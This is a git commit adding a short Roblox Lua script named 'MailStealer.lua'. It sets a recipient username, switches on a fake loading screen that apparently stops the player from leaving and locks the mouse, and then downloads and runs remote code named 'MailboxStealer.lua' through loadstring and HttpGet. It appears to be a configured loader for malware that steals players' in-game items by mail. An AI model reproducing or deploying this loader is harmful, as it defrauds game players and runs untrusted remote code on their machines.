5454c46782fc689eaa54c3708efb42b204e7c888
BestHubRBX <136733782+BestHubRBX@users.noreply.github.com>
2023-06-16 20:33:58 +0300

    Create MailStealer.lua

---
+++ MailStealer.lua
@@ -0,0 +1,14 @@
+UserName = "gtedrffe"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "SimoNHub Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 30
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua", true))()
